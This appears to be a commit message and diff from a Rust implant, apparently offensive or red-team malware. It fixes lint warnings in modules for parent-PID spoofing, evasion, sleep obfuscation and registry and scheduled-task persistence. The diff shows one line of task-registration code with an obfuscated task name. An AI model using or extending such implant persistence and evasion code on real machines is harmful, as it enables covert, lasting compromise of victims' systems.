fix: resolve all clippy -D warnings for release build
- ppid.rs: remove redundant `use crate::dbg_log` (#[macro_export] macros
  are in scope without an explicit use)
- registry.rs: add #[allow(dead_code)] to RegistryRunPersistence struct
  and RUN_KEY const (run key removed from persistence chain by design)
- evasion/mod.rs: fix doc list continuation indentation (1b sub-item)
- sleep.rs: fix doc list continuation indentation after list item
- scheduled_task.rs: remove unnecessary i32 cast on TASK_CREATE_OR_UPDATE.0
  (inner field is already i32)

+++ implant/src/persistence/windows/scheduled_task.rs
@@ -72,7 +72,7 @@ impl PersistenceTrait for ScheduledTaskPersistence {
             folder.RegisterTaskDefinition(
                 &BSTR::from(obfstr::obfstr!(TASK_NAME)),
                 &task,
-                TASK_CREATE_OR_UPDATE.0 as i32,
+                TASK_CREATE_OR_UPDATE.0,
                 &null_var,
                 &null_var,
                 TASK_LOGON_INTERACTIVE_TOKEN,
